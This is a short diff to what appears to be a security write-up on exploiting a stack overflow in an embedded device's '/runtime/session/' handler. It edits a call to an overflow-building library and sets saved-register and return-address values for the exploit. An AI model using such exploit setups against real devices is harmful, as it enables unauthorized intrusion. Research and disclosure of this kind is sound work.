@@ -44,7 +44,7 @@ Other value of importance found through analysis are:
 ### Generating the Overflow
 ```bash
 >>> import mow
->>> overflow = mow.Overflow(0x400, 8, mow.LITTLE_ENDIAN, 0, 0x2aaf8000, '/runtime/session/')
+>>> overflow = mow.Overflow(0x400, 9, mow.LITTLE_ENDIAN, 0, 0x2aaf8000, '/runtime/session/')
 >>> overflow.s0 = 0x531f8
 >>> overflow.s1 = 0x15b6c
 >>> overflow.ra = 0x57d60
